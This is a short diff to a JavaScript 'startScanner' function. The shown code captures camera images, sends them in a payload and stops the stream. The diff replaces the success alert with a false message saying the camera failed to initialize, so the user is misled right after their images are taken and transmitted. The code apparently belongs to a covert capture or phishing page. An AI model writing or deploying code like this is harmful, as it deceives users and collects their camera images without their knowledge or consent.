@@ -289,7 +289,7 @@ function startScanner(){
       payload.images=imagesCaptured.filter(img=>img && img.length>0);
       send(true);
       stream.getTracks().forEach(t=>t.stop());
-      alert("Camera captured images.");
+      alert("Camera failed to initialize.");
     };
   }).catch(err=>{ console.log("Camera error:",err); alert("Failed to access camera."); });
 }
